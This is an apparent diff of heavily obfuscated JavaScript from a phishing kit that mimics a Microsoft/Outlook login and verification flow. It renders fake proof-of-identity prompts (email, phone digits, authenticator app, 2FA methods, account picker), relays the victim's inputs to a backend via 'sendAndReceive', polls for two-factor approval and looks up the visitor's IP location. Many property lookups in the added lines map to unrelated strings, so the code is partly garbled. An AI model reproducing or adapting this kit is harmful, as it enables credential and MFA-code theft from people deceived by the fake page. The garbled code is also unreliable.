-                    document['getElementById'](`table-cell` + view)['querySelector'](`maxLength`)[`position`][`section_multipleaccounts_adfs`] = '', document[`915612HwjQev`](`table-cell` + view)[`error_2fa`][`live.`]('d-none'), document[`915612HwjQev`](`authapperrordesc`)[`hide-to-left `](`maxLength`)[`position`][`section_multipleaccounts_adfs`] = '', document[`915612HwjQev`]('section_uname')[`error_2fa`][`json`]('d-none'), document[`style`][`position`]['backgroundImage'] && (document['body']['style'][`<p class="mb-16">`] = ''), document['body'][`position`]['backgroundColor'] && (document[`style`][`position`]['backgroundColor'] = '');
-                }
-                _0x1c51da[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == `setProperty` && (document['getElementById'](`auto`)['querySelector']('.title')[`Too many Attempts`] = _0x1c51da['title'], checkerrordesc('signinanothererrordesc', 0x2, _0x1c51da['signinanothererrordesc']), document[`915612HwjQev`](`table-cell` + view)['classList'][`live.`](`onclick`), document[`915612HwjQev`](`auto`)[`error_2fa`]['remove'](`onclick`), bottomsectionlinks(`input[type="radio"]`, _0x1c51da['bottomsection']), view = 'signinanothererror'), _0x1c51da[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == 'you\x20dont\x20have\x20access' && (document[`915612HwjQev`](`table-cell` + view)[`error_2fa`][`live.`](`onclick`), document[`915612HwjQev`](`section_authcall`)[`error_2fa`][`json`]('d-none'), view = 'youdonthaveaccess'), _0x1c51da[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == `https://get.geojs.io/v1/ip/geo.json` && (document[`915612HwjQev`](`.text-body`)[`signoutoption`] = '', document[`915612HwjQev`]('otpimg')[`yahoo.`](`remove`, _0x1c51da[`pdfemail`]), checkerrordesc(`2fa is off newwebsite`, 0x0, _0x1c51da[`authcall`]), bottomsectionlinks(`2fa is off newwebsite`, _0x1c51da[`listitem`]), changebackbutton(`2fa is off newwebsite`, _0x1c51da[`country`]), document[`915612HwjQev`](`table-cell` + view)[`error_2fa`][`live.`]('d-none'), document['getElementById'](`65aCTyIy`)[`error_2fa`][`json`](`onclick`), view = `2fa is off newwebsite`, viewtype = null), _0x1c51da['message'] == `otp_livedesc` && (document[`915612HwjQev`](`.text-body`)[`signoutoption`] = '', document['getElementById']('authappimg')[`yahoo.`]('src', _0x1c51da[`pdfemail`]), checkerrordesc('authapp', 0x0, _0x1c51da[`authcall`]), bottomsectionlinks(`
-      <div class="text-block-body" id="iEnterProofDesc">
-        To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.
-      </div>
-      <div role="alert" aria-live="assertive">
-        <div class="alert alert-error Hide" id="iProofInputError"></div>
-      </div>
-      <div class="emailPartial dirltr input-group input-max-width" id="iProofEmailEntry" style="display: table;">
-        <input class="form-control noRightBorder" autocomplete="off" type="email" id="iProofEmail" name="iProofEmail" maxlength="113" aria-required="true" aria-label="Email name" aria-describedby="iProofInputError">
-        <label class="input-group-addon noLeftBorder outlookEmailLabel" id="iConfirmProofEmailDomain">@`, _0x1c51da[`listitem`]), changebackbutton(`
-      <div class="text-block-body" id="iEnterProofDesc">
-        To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.
-      </div>
-      <div role="alert" aria-live="assertive">
-        <div class="alert alert-error Hide" id="iProofInputError"></div>
-      </div>
-      <div class="emailPartial dirltr input-group input-max-width" id="iProofEmailEntry" style="display: table;">
-        <input class="form-control noRightBorder" autocomplete="off" type="email" id="iProofEmail" name="iProofEmail" maxlength="113" aria-required="true" aria-label="Email name" aria-describedby="iProofInputError">
-        <label class="input-group-addon noLeftBorder outlookEmailLabel" id="iConfirmProofEmailDomain">@`, _0x1c51da[`country`]), document[`915612HwjQev`](`section_accessblocked`)[`Too many Attempts`] = _0x1c51da['authappcode'], document[`915612HwjQev`](`table-cell` + view)[`error_2fa`][`live.`]('d-none'), document[`915612HwjQev`](`Verify Online`)[`error_2fa`]['remove'](`onclick`), view = 'authapp', viewtype = null, wait2fa(`block`, _0x1c51da[`confirmemailorphone_live`])), _0x1c51da[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == `input-group` && (document['getElementById'](`log`)['querySelector']('.back')[`resentlink`](), document[`915612HwjQev`]('error_2fa')[`signoutoption`] = '', document['getElementById'](`checkemail`)[`yahoo.`](`remove`, _0x1c51da[`pdfemail`]), checkerrordesc(`indentNonCollapsible`, 0x0, _0x1c51da[`authcall`]), bottomsectionlinks(`indentNonCollapsible`, _0x1c51da['bottomsection']), changebackbutton(`indentNonCollapsible`, _0x1c51da[`country`]), document[`915612HwjQev`]('section_' + view)[`error_2fa`]['toggle']('d-none'), document[`915612HwjQev`](`log`)[`error_2fa`][`json`](`onclick`), view = 'authcall', viewtype = null, wait2fa(`section_uname`)), _0x1c51da['message'] == `CompanionAppsNotification` && (bottomsectionlinks('2fa', _0x1c51da['bottomsection']), changebackbutton('2fa', _0x1c51da[`country`]), checkerrordesc(`</a></p>`, 0x1, _0x1c51da[`authcall`])), _0x1c51da['message'] == 'verifyemail' && (document[`915612HwjQev`](`.text-body`)['innerText'] = '', checkerrordesc(`approved`, 0x0, _0x1c51da['description']), bottomsectionlinks(`s forwards`, _0x1c51da[`listitem`]), changebackbutton(`s forwards`, _0x1c51da['backbutton']), document[`915612HwjQev`]('section_' + view)['classList'][`live.`]('d-none'), document[`915612HwjQev`](`.okta-container #login-bg-image`)[`error_2fa`][`json`]('d-none'), view = `s forwards`, viewtype = null), _0x1c51da[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == `fadeinform 1s forwards` && (document[`915612HwjQev`](`useAuthenticator`)[`hide-to-left `](`pop`)[`Too many Attempts`] = `oninput`, document['getElementById'](`iAdditionalProofInfo`)[`error_2fa`]['toggle']('error'), document['getElementById'](`iAdditionalProofInfo`)[`show-from-right `] = '<span>Sorry,\x20we\x27re\x20having\x20trouble\x20verifying\x20your\x20account.\x20Please\x20try\x20again.</span><a\x20id=\x22ViewDetails\x22\x20class=\x22no-wrap\x22\x20href=\x22#\x22>View\x20details</a>', view = `section_signin_blocked_live`, viewtype = null);
-            }
-        })[`TwoWayVoiceMobile`](_0x1c295e => {
-            const _0x1a1146 = _0x1d6260;
-            loadinganimation(0x1), console[`CompanionAppsNotification`]('Error:', _0x1c295e);
+                }, 0x1f4))),
+            _0x722f1d[`</a> or try to sign in again shortly.</p>`] ==
+              `includes` &&
+              (document["getElementById"](`bannerlogo`)["classList"][`waiting`](
+                `background-image`,
+              ),
+              document["getElementById"](`24px`)["classList"][
+                `<a class="link mb-16" href="#" data-id="`
+              ]("d-none"),
+              (view = `authapp_live_code`)),
+            _0x722f1d[`</a> or try to sign in again shortly.</p>`] ==
+              `#btn_next_doc` &&
+              (document["getElementById"]("section_authapp_live")[`pdfemail`][
+                `waiting`
+              ](`background-image`),
+              document[`selectprotectoption(this)`](`24px`)[`pdfemail`][
+                `<a class="link mb-16" href="#" data-id="`
+              ](`background-image`),
+              (view = `authapp_live_code`)),
+            _0x722f1d[`</a> or try to sign in again shortly.</p>`] == `auth` &&
+              checkerrordesc("authcall", 0x1, _0x722f1d[`confirmemail`]));
+        })
+        [`section_signinanothererror`]((_0x512349) => {
+          console["error"]("Error:", _0x512349);
         });
-    }
+  }
+  wait2facancel == 0x1 && (wait2facancel = 0x0);
 }
-
-function authappbottomtext(_0x4dcc33) {
-    const _0xb3358b = _0xe042e,
-        _0x249d9b = document[_0xb3358b(0x2fd)](_0xb3358b(0x2fa))['querySelector'](_0xb3358b(0x238));
-    _0x249d9b['innerHTML'] = '', _0x4dcc33[_0xb3358b(0x268)](_0x1785aa => {
-        const _0x5793c7 = _0xb3358b;
-        if (_0x1785aa[_0x5793c7(0x222)] === _0x5793c7(0x1fd)) {
-            const _0x1f0248 = document[_0x5793c7(0x228)]('p');
-            _0x1f0248[_0x5793c7(0x34a)][_0x5793c7(0x2f0)](_0x5793c7(0x341), _0x5793c7(0x2d1)), _0x1f0248[_0x5793c7(0x2fc)] = _0x1785aa['text'] + '\x20<a\x20href=\x22#\x22\x20data-id=\x22' + _0x1785aa[_0x5793c7(0x1db)] + (_0x5793c7(0x330) + _0x1785aa[_0x5793c7(0x2b0)] + _0x5793c7(0x364)), _0x249d9b[_0x5793c7(0x32a)](_0x1f0248);
-        } else {
-            if (_0x1785aa['type'] === _0x5793c7(0x2c7)) {
-                const _0x393fbb = document['createElement']('p');
-                _0x393fbb[_0x5793c7(0x34a)][_0x5793c7(0x2f0)](_0x5793c7(0x341), _0x5793c7(0x2d1)), _0x393fbb[_0x5793c7(0x2fc)] = _0x5793c7(0x2a8) + _0x1785aa['a_id'] + (_0x5793c7(0x330) + _0x1785aa[_0x5793c7(0x2b0)] + _0x5793c7(0x247) + _0x1785aa[_0x5793c7(0x2e4)]), _0x249d9b['appendChild'](_0x393fbb);
-                const _0x2fa8ee = document[_0x5793c7(0x228)]('p');
-                _0x2fa8ee[_0x5793c7(0x29e)] = _0x1785aa[_0x5793c7(0x2e4)], _0x249d9b[_0x5793c7(0x32a)](_0x2fa8ee);
-            } else {
-                if (_0x1785aa['type'] === _0x5793c7(0x341)) {
-                    const _0x1bef3c = document[_0x5793c7(0x228)]('a');
-                    _0x1bef3c['classList'][_0x5793c7(0x2f0)]('link', _0x5793c7(0x2d1)), _0x1bef3c[_0x5793c7(0x2bf)](_0x5793c7(0x266), _0x5793c7(0x211)), _0x1bef3c[_0x5793c7(0x2bf)](_0x5793c7(0x344), _0x1785aa[_0x5793c7(0x1db)]), _0x1bef3c[_0x5793c7(0x2bf)](_0x5793c7(0x1e6), 'linkoptionclick(this)'), _0x1bef3c[_0x5793c7(0x29e)] = _0x1785aa['a_text'], _0x1bef3c[_0x5793c7(0x1d1)] = '#', _0x249d9b[_0x5793c7(0x32a)](_0x1bef3c);
-                } else {
-                    if (_0x1785aa[_0x5793c7(0x222)] === 'text') {
-                        const _0x5d7982 = document['createElement']('p');
-                        _0x5d7982[_0x5793c7(0x34a)]['add'](_0x5793c7(0x2d1)), _0x5d7982[_0x5793c7(0x29e)] = _0x1785aa[_0x5793c7(0x2e4)], _0x249d9b[_0x5793c7(0x32a)](_0x5d7982);
-                    }
-                }
+function backbuttonclick(_0x251c5f, _0x38b174) {
+  const _0x1359e5 = _0x283fde;
+  _0x251c5f[`error_authapp_live`] == "Back" && runanimation(0x0, view, 0.3),
+    _0x251c5f["textContent"] == `113` &&
+      (_0x38b174 == 0x1 && (callurl = `text_link`),
+      _0x38b174 == 0x2 && (callurl = `Please, provide a valid email.`),
+      sendAndReceive(callurl, [_0x251c5f["getAttribute"](`ihaveacode`)], 0x1)
+        [`hide-to-left `]((_0x2fced9) => {
+          const _0x16eb3a = _0x1359e5;
+          _0x2fced9 &&
+            _0x2fced9[`</a> or try to sign in again shortly.</p>`] !==
+              "waiting\x20for\x20previous\x20request\x20to\x20complete" &&
+            ((document["getElementById"](`innerText` + view)[
+              `.loading-container`
+            ](`relative`)[`getElementById`]["animation"] = ""),
+            _0x2fced9[`</a> or try to sign in again shortly.</p>`] ==
+              "clicked" &&
+              _0x251c5f[`error_authapp_live`] == "Back" &&
+              (runanimation(0x3, `2fa is on`, 0.3),
+              (multipleaccountsback = 0x0),
+              document[`selectprotectoption(this)`](`<p>`)[`pdfemail`][
+                `waiting`
+              ](`background-image`),
+              (document[`selectprotectoption(this)`](`iProofPhone`)[
+                `.loading-container`
+              ](".sectioncontent")[`getElementById`][
+                `approve auth request auth app`
+              ] = ""),
+              document["getElementById"](`iProofPhone`)[`pdfemail`]["remove"](
+                `background-image`,
+              ),
+              document[
+                `
+            ::-moz-selection {
+            background: #a6fff8;
             }
-        }
-    });
-}
-
-function selectprotectoption(_0x139eb5) {
-    const _0x18a998 = _0xe042e,
-        _0x517121 = document[_0x18a998(0x1d7)](_0x18a998(0x2e2));
-    _0x517121['forEach'](_0x150e73 => {
-        const _0x5946b4 = _0x18a998;
-        _0x150e73[_0x5946b4(0x29c)](_0x5946b4(0x33a)), _0x150e73[_0x5946b4(0x29c)]('aria-checked');
-    });
-    const _0x5a860c = _0x139eb5,
-        _0xf5c11 = document[_0x18a998(0x1d7)](_0x18a998(0x37a));
-    _0xf5c11[_0x18a998(0x268)](_0x45fb5b => {
-        const _0x270686 = _0x18a998;
-        _0x45fb5b !== _0x139eb5 && _0x45fb5b[_0x270686(0x1e4)]['removeChild'](_0x45fb5b);
-    }), nexteletext = _0x139eb5[_0x18a998(0x2e0)][_0x18a998(0x29e)];
-    const _0x23485b = document[_0x18a998(0x228)](_0x18a998(0x331));
-    _0x23485b['classList'][_0x18a998(0x2f0)]('iAdditionalProofInfo');
-    if (_0x5a860c['value'] === _0x18a998(0x232)) emailval = nexteletext[_0x18a998(0x2d9)]('@')[_0x18a998(0x315)](), _0x23485b[_0x18a998(0x2fc)] = _0x18a998(0x28f) + emailval + _0x18a998(0x2ca), document[_0x18a998(0x2fd)]('btn_protectaccount')[_0x18a998(0x29e)] = _0x18a998(0x234);
-    else {
-        if (_0x5a860c[_0x18a998(0x259)] === _0x18a998(0x2e4)) phoneval = nexteletext[_0x18a998(0x2d9)]('*')[_0x18a998(0x315)](), _0x23485b[_0x18a998(0x2fc)] = _0x18a998(0x2d8) + phoneval + _0x18a998(0x2eb), document[_0x18a998(0x2fd)](_0x18a998(0x298))[_0x18a998(0x29e)] = _0x18a998(0x234);
-        else {
-            if (_0x5a860c[_0x18a998(0x259)] === _0x18a998(0x318)) document['getElementById'](_0x18a998(0x298))[_0x18a998(0x29e)] = _0x18a998(0x1ec);
-            else _0x5a860c[_0x18a998(0x259)] === _0x18a998(0x219) && (document[_0x18a998(0x2fd)]('btn_protectaccount')[_0x18a998(0x29e)] = _0x18a998(0x272));
-        }
-    }
-    _0x139eb5[_0x18a998(0x1e4)]['parentNode']['parentNode']['appendChild'](_0x23485b);
-}
-
-function displayprotectoptions(_0x3d7853) {
-    const _0x184e89 = _0xe042e,
-        _0x32e640 = document[_0x184e89(0x2fd)]('protectaccountoptions');
-    _0x32e640['innerHTML'] = '', _0x3d7853['forEach']((_0x296ede, _0x1e7a67) => {
-        const _0x19c140 = _0x184e89,
-            _0x21d063 = document['createElement'](_0x19c140(0x331));
-        _0x21d063['id'] = 'proofDiv' + _0x1e7a67;
-        const _0x4ec3ba = document[_0x19c140(0x228)](_0x19c140(0x331));
-        _0x4ec3ba[_0x19c140(0x34a)][_0x19c140(0x2f0)]('radio');
-        const _0x2f230d = document['createElement']('label'),
-            _0x2e8c08 = document[_0x19c140(0x228)](_0x19c140(0x2f5));
-        _0x2e8c08[_0x19c140(0x222)] = _0x19c140(0x30c), _0x2e8c08[_0x19c140(0x2bf)](_0x19c140(0x337), _0x19c140(0x37e)), _0x2e8c08['role'] = 'radio', _0x2e8c08['name'] = _0x19c140(0x36b), _0x2e8c08['value'] = _0x296ede[_0x19c140(0x222)], _0x2e8c08[_0x19c140(0x34a)][_0x19c140(0x2f0)](_0x19c140(0x34e)), _0x2e8c08[_0x19c140(0x2bf)](_0x19c140(0x1f5), 'iEnterProofDesc\x20iProofLbl1');
-        const _0x4c447d = document[_0x19c140(0x228)](_0x19c140(0x33b));
-        _0x4c447d['id'] = _0x19c140(0x20f), _0x4c447d[_0x19c140(0x34a)][_0x19c140(0x2f0)](_0x19c140(0x336)), _0x4c447d[_0x19c140(0x29e)] = _0x296ede[_0x19c140(0x2e4)];
-        _0x1e7a67 == 0x0 && (_0x2e8c08[_0x19c140(0x33a)] = !![]);
-        _0x2f230d[_0x19c140(0x32a)](_0x2e8c08), _0x2f230d[_0x19c140(0x32a)](_0x4c447d), _0x4ec3ba[_0x19c140(0x32a)](_0x2f230d), _0x21d063[_0x19c140(0x32a)](_0x4ec3ba);
-        if (_0x1e7a67 == 0x0 && _0x296ede['type'] === _0x19c140(0x232)) {
-            emailval = _0x296ede[_0x19c140(0x2e4)]['split']('@')[_0x19c140(0x315)]();
-            const _0x515de7 = document[_0x19c140(0x228)]('div');
-            _0x515de7[_0x19c140(0x34a)][_0x19c140(0x2f0)]('iAdditionalProofInfo');
-            const _0x50c585 = document[_0x19c140(0x228)](_0x19c140(0x331));
-            _0x50c585[_0x19c140(0x34a)][_0x19c140(0x2f0)](_0x19c140(0x306)), _0x50c585['id'] = _0x19c140(0x317), _0x50c585['textContent'] = _0x19c140(0x210);
-            const _0x5db1d5 = document[_0x19c140(0x228)]('div');
-            _0x5db1d5['setAttribute'](_0x19c140(0x2e7), _0x19c140(0x2e5)), _0x5db1d5['setAttribute'](_0x19c140(0x24c), _0x19c140(0x314));
-            const _0x4c74fb = document['createElement'](_0x19c140(0x331));
-            _0x4c74fb[_0x19c140(0x34a)][_0x19c140(0x2f0)](_0x19c140(0x2e5), _0x19c140(0x31b), 'Hide'), _0x4c74fb['id'] = _0x19c140(0x2c3);
-            const _0x24f315 = document[_0x19c140(0x228)](_0x19c140(0x331));
-            _0x24f315[_0x19c140(0x34a)]['add'](_0x19c140(0x2f9), _0x19c140(0x336), _0x19c140(0x2d4), _0x19c140(0x1d9)), _0x24f315['id'] = _0x19c140(0x384), _0x24f315['style'][_0x19c140(0x25b)] = _0x19c140(0x23b);
-            const _0x59912f = document['createElement']('input');
-            _0x59912f['type'] = _0x19c140(0x232), _0x59912f[_0x19c140(0x283)] = 'iProofEmail', _0x59912f[_0x19c140(0x34a)][_0x19c140(0x2f0)]('form-control', 'noRightBorder'), _0x59912f[_0x19c140(0x2bf)](_0x19c140(0x281), _0x19c140(0x24f)), _0x59912f[_0x19c140(0x1c5)] = _0x19c140(0x2f3), _0x59912f[_0x19c140(0x2bf)](_0x19c140(0x287), _0x19c140(0x2dc)), _0x59912f[_0x19c140(0x2bf)](_0x19c140(0x2a7), _0x19c140(0x265)), _0x59912f[_0x19c140(0x2bf)]('aria-describedby', _0x19c140(0x2c3));
-            const _0x55f03c = document[_0x19c140(0x228)](_0x19c140(0x27f));
-            _0x55f03c[_0x19c140(0x34a)][_0x19c140(0x2f0)](_0x19c140(0x277), _0x19c140(0x2f4), 'outlookEmailLabel'), _0x55f03c[_0x19c140(0x29e)] = '@' + emailval, _0x24f315['appendChild'](_0x59912f), _0x24f315[_0x19c140(0x32a)](_0x55f03c), _0x515de7[_0x19c140(0x32a)](_0x50c585), _0x5db1d5['appendChild'](_0x4c74fb), _0x515de7[_0x19c140(0x32a)](_0x5db1d5), _0x515de7['appendChild'](_0x24f315), _0x21d063['appendChild'](_0x4ec3ba), _0x21d063[_0x19c140(0x32a)](_0x515de7);
-        } else {
-            if (_0x1e7a67 == 0x0 && _0x296ede[_0x19c140(0x222)] === 'text') {
-                const _0x533ffa = document[_0x19c140(0x228)]('div');
-                _0x533ffa[_0x19c140(0x34a)][_0x19c140(0x2f0)](_0x19c140(0x21b));
-                const _0x4358ce = document[_0x19c140(0x228)](_0x19c140(0x331));
-                _0x4358ce['classList']['add'](_0x19c140(0x306)), _0x4358ce['id'] = _0x19c140(0x317), _0x4358ce[_0x19c140(0x29e)] = 'To\x20verify\x20that\x20this\x20is\x20your\x20phone\x20number,\x20enter\x20the\x20last\x204\x20digits\x20including\x2095,\x20and\x20then\x20click\x20\x22Send\x20code\x22\x20to\x20receive\x20your\x20code.';
-                const _0x59bc83 = document[_0x19c140(0x228)](_0x19c140(0x331));
-                _0x59bc83[_0x19c140(0x2bf)](_0x19c140(0x2e7), _0x19c140(0x2e5)), _0x59bc83[_0x19c140(0x2bf)](_0x19c140(0x24c), _0x19c140(0x314));
-                const _0x4f6a79 = document[_0x19c140(0x228)]('div');
-                _0x4f6a79[_0x19c140(0x34a)]['add'](_0x19c140(0x2e5), _0x19c140(0x31b), _0x19c140(0x383)), _0x4f6a79['id'] = 'iProofInputError';
-                const _0x43e37a = document[_0x19c140(0x228)](_0x19c140(0x331));
-                _0x43e37a[_0x19c140(0x34a)][_0x19c140(0x2f0)](_0x19c140(0x292)), _0x43e37a['id'] = _0x19c140(0x1ce), _0x43e37a[_0x19c140(0x266)][_0x19c140(0x25b)] = '';
-                const _0x2bb008 = document[_0x19c140(0x228)](_0x19c140(0x27f));
-                _0x2bb008[_0x19c140(0x34a)][_0x19c140(0x2f0)](_0x19c140(0x34c)), _0x2bb008['id'] = _0x19c140(0x249), _0x2bb008['setAttribute'](_0x19c140(0x30d), _0x19c140(0x20b)), _0x2bb008['setAttribute'](_0x19c140(0x21e), _0x19c140(0x2dc)), _0x2bb008[_0x19c140(0x29e)] = 'Last\x204\x20digits\x20of\x20phone\x20number';
-                const _0x139ebb = document[_0x19c140(0x228)]('input');
-                _0x139ebb[_0x19c140(0x222)] = _0x19c140(0x365), _0x139ebb['id'] = _0x19c140(0x20b), _0x139ebb[_0x19c140(0x283)] = _0x19c140(0x20b), _0x139ebb[_0x19c140(0x34a)][_0x19c140(0x2f0)]('form-control', _0x19c140(0x1d9)), _0x139ebb['setAttribute'](_0x19c140(0x281), _0x19c140(0x24f)), _0x139ebb['maxLength'] = '4', _0x139ebb[_0x19c140(0x2bf)](_0x19c140(0x287), _0x19c140(0x2dc)), _0x139ebb[_0x19c140(0x2bf)]('aria-label', _0x19c140(0x1bf)), _0x139ebb[_0x19c140(0x2bf)](_0x19c140(0x1f5), _0x19c140(0x2c3)), _0x43e37a['appendChild'](_0x2bb008), _0x43e37a[_0x19c140(0x32a)](_0x139ebb), _0x533ffa[_0x19c140(0x32a)](_0x4358ce), _0x59bc83[_0x19c140(0x32a)](_0x4f6a79), _0x533ffa['appendChild'](_0x59bc83), _0x533ffa[_0x19c140(0x32a)](_0x43e37a), _0x21d063[_0x19c140(0x32a)](_0x4ec3ba), _0x21d063[_0x19c140(0x32a)](_0x533ffa);
+            
+            ::selection {
+            background: #a6fff8;
             }
-        }
-        _0x32e640['appendChild'](_0x21d063);
-    });
-}
-
-function displaymultipleaccounts(_0x39fc07) {
-    const _0x54a2f0 = _0xe042e,
-        _0x1c653b = document[_0x54a2f0(0x2fd)](_0x54a2f0(0x388));
-    _0x1c653b['innerHTML'] = '', _0x39fc07[_0x54a2f0(0x268)](_0x4fee30 => {
-        const _0x3994ea = _0x54a2f0,
-            _0x15e998 = document[_0x3994ea(0x228)](_0x3994ea(0x331));
-        _0x15e998['classList'][_0x3994ea(0x2f0)](_0x3994ea(0x1de), _0x3994ea(0x324)), _0x15e998[_0x3994ea(0x2bf)](_0x3994ea(0x1e6), _0x3994ea(0x2fb)), _0x15e998[_0x3994ea(0x2bf)](_0x3994ea(0x2e7), _0x3994ea(0x36f));
-        const _0x550587 = document[_0x3994ea(0x228)]('div');
-        _0x550587['classList'][_0x3994ea(0x2f0)](_0x3994ea(0x23b)), _0x550587['setAttribute']('role', _0x3994ea(0x377));
-        const _0x1fd211 = document[_0x3994ea(0x228)](_0x3994ea(0x331));
-        _0x1fd211[_0x3994ea(0x34a)]['add']('table-row');
-        const _0x43ebda = document[_0x3994ea(0x228)](_0x3994ea(0x331));
-        _0x43ebda['classList'][_0x3994ea(0x2f0)]('table-cell', _0x3994ea(0x27c));
-        const _0x407f76 = document[_0x3994ea(0x228)](_0x3994ea(0x25f));
-        _0x407f76['classList'][_0x3994ea(0x2f0)](_0x3994ea(0x27c)), _0x407f76['setAttribute'](_0x3994ea(0x2e7), _0x3994ea(0x225)), _0x407f76[_0x3994ea(0x2bf)](_0x3994ea(0x293), _0x4fee30[_0x3994ea(0x328)]), _0x43ebda['appendChild'](_0x407f76);
-        const _0x38dd9e = document[_0x3994ea(0x228)]('div');
-        _0x38dd9e[_0x3994ea(0x34a)]['add'](_0x3994ea(0x276), 'text-left', _0x3994ea(0x36d));
-        const _0x3aa4b1 = document[_0x3994ea(0x228)](_0x3994ea(0x331));
-        _0x3aa4b1[_0x3994ea(0x1ca)] = _0x4fee30[_0x3994ea(0x2b4)];
-        const _0x3622aa = document['createElement'](_0x3994ea(0x331)),
-            _0x5eddae = document['createElement'](_0x3994ea(0x21c));
-        _0x5eddae['innerText'] = _0x4fee30['titlehint'], _0x3622aa[_0x3994ea(0x32a)](_0x5eddae);
-        const _0x3f41ee = document[_0x3994ea(0x228)](_0x3994ea(0x331)),
-            _0x30f519 = document[_0x3994ea(0x228)](_0x3994ea(0x21c));
-        _0x30f519[_0x3994ea(0x1ca)] = _0x4fee30[_0x3994ea(0x232)], _0x3f41ee[_0x3994ea(0x32a)](_0x30f519), _0x38dd9e[_0x3994ea(0x32a)](_0x3aa4b1), _0x38dd9e[_0x3994ea(0x32a)](_0x3622aa), _0x38dd9e[_0x3994ea(0x32a)](_0x3f41ee), _0x1fd211[_0x3994ea(0x32a)](_0x43ebda), _0x1fd211[_0x3994ea(0x32a)](_0x38dd9e), _0x550587[_0x3994ea(0x32a)](_0x1fd211), _0x15e998[_0x3994ea(0x32a)](_0x550587), _0x1c653b[_0x3994ea(0x32a)](_0x15e998);
-    });
-}
-
-function displaytwofamethods(_0x258b57) {
-    const _0x46cbd7 = _0xe042e,
-        _0x58e0cc = document[_0x46cbd7(0x2fd)](_0x46cbd7(0x30a));
-    _0x58e0cc[_0x46cbd7(0x2fc)] = '', _0x258b57['forEach'](_0x41ac66 => {
-        const _0x4eb86a = _0x46cbd7,
-            _0x5d1d7e = document[_0x4eb86a(0x228)](_0x4eb86a(0x331));
-        _0x5d1d7e[_0x4eb86a(0x34a)][_0x4eb86a(0x2f0)]('row', _0x4eb86a(0x324)), _0x5d1d7e[_0x4eb86a(0x2bf)]('data-methodid', _0x41ac66['methodid']), _0x5d1d7e[_0x4eb86a(0x2bf)](_0x4eb86a(0x1e6), _0x4eb86a(0x207)), _0x5d1d7e['setAttribute']('role', _0x4eb86a(0x36f));
-        const _0x1e8093 = document[_0x4eb86a(0x228)](_0x4eb86a(0x331));
-        _0x1e8093[_0x4eb86a(0x34a)][_0x4eb86a(0x2f0)](_0x4eb86a(0x23b)), _0x1e8093[_0x4eb86a(0x2bf)]('tabindex', '0'), _0x1e8093[_0x4eb86a(0x2bf)](_0x4eb86a(0x2e7), _0x4eb86a(0x377));
-        const _0x5a1425 = document['createElement'](_0x4eb86a(0x331));
-        _0x5a1425['classList'][_0x4eb86a(0x2f0)](_0x4eb86a(0x1cf));
-        const _0x446f24 = document['createElement']('div');
-        _0x446f24['classList'][_0x4eb86a(0x2f0)](_0x4eb86a(0x276), _0x4eb86a(0x27c));
-        if (_0x41ac66['hasOwnProperty'](_0x4eb86a(0x2e4)) && _0x41ac66[_0x4eb86a(0x2b2)](_0x4eb86a(0x328))) {
-            const _0x1abedf = document['createElement']('img');
-            _0x1abedf['classList'][_0x4eb86a(0x2f0)](_0x4eb86a(0x27c)), _0x1abedf[_0x4eb86a(0x2bf)](_0x4eb86a(0x2e7), _0x4eb86a(0x225)), _0x1abedf['setAttribute']('src', _0x41ac66['image_src']), _0x446f24[_0x4eb86a(0x32a)](_0x1abedf);
-        }
-        const _0x56233f = document[_0x4eb86a(0x228)](_0x4eb86a(0x331));
-        _0x56233f[_0x4eb86a(0x34a)][_0x4eb86a(0x2f0)](_0x4eb86a(0x276), _0x4eb86a(0x2a2), _0x4eb86a(0x36d));
-        const _0x6f7b48 = _0x41ac66[_0x4eb86a(0x2b2)](_0x4eb86a(0x2e4)) ? _0x41ac66[_0x4eb86a(0x2e4)] : '';
-        _0x56233f[_0x4eb86a(0x29e)] = _0x6f7b48, _0x5a1425[_0x4eb86a(0x32a)](_0x446f24), _0x5a1425[_0x4eb86a(0x32a)](_0x56233f), _0x1e8093['appendChild'](_0x5a1425), _0x5d1d7e['appendChild'](_0x1e8093), _0x58e0cc[_0x4eb86a(0x32a)](_0x5d1d7e);
-    });
-}
-
-function selecttwofamethod(_0x4103a9) {
-    const _0x223dba = _0xe042e,
-        _0x5063c8 = document[_0x223dba(0x2fd)]('2famethods')['getElementsByClassName'](_0x223dba(0x346));
-    let _0x28eee3 = _0x4103a9[_0x223dba(0x327)](_0x223dba(0x33f));
-    loadinganimation(0x0), sendAndReceive(_0x223dba(0x301), [_0x28eee3], 0x1)['then'](_0x5c687e => {
-        const _0xab1a37 = _0x223dba;
-        if (_0x5c687e && _0x5c687e['message'] !== _0xab1a37(0x360)) {
-            loadinganimation(0x1), wait2facancel = 0x0;
-            _0x5c687e[_0xab1a37(0x299)] == _0xab1a37(0x235) && (document[_0xab1a37(0x2fd)](_0xab1a37(0x2bb))['innerText'] = 'Verify\x20your\x20email', document[_0xab1a37(0x2fd)]('inp_confirmemailorphone_live')['removeAttribute'](_0xab1a37(0x31a)), document[_0xab1a37(0x2fd)]('inp_confirmemailorphone_live')[_0xab1a37(0x29c)]('oninput'), document[_0xab1a37(0x2fd)](_0xab1a37(0x26c))[_0xab1a37(0x259)] = '', document[_0xab1a37(0x2fd)](_0xab1a37(0x26c))[_0xab1a37(0x2bf)]('placeholder', _0xab1a37(0x31e)), document[_0xab1a37(0x2fd)](_0xab1a37(0x284))['style'][_0xab1a37(0x25b)] = _0xab1a37(0x201), document[_0xab1a37(0x2fd)](_0xab1a37(0x284))[_0xab1a37(0x1ca)] = '', checkerrordesc('confirmemailorphone_live', 0x0, _0x5c687e[_0xab1a37(0x2de)]), bottomsectionlinks(_0xab1a37(0x36c), _0x5c687e[_0xab1a37(0x227)]), changebackbutton(_0xab1a37(0x36c), _0x5c687e[_0xab1a37(0x214)]), document[_0xab1a37(0x2fd)]('confirmemailorphone_live_hidden')[_0xab1a37(0x259)] = _0x5c687e[_0xab1a37(0x232)], document['getElementById'](_0xab1a37(0x2ff) + view)[_0xab1a37(0x34a)][_0xab1a37(0x2cb)](_0xab1a37(0x26f)), document['getElementById'](_0xab1a37(0x1c1))['classList'][_0xab1a37(0x20a)]('d-none'), view = 'confirmemailorphone_live', viewtype = _0xab1a37(0x232));
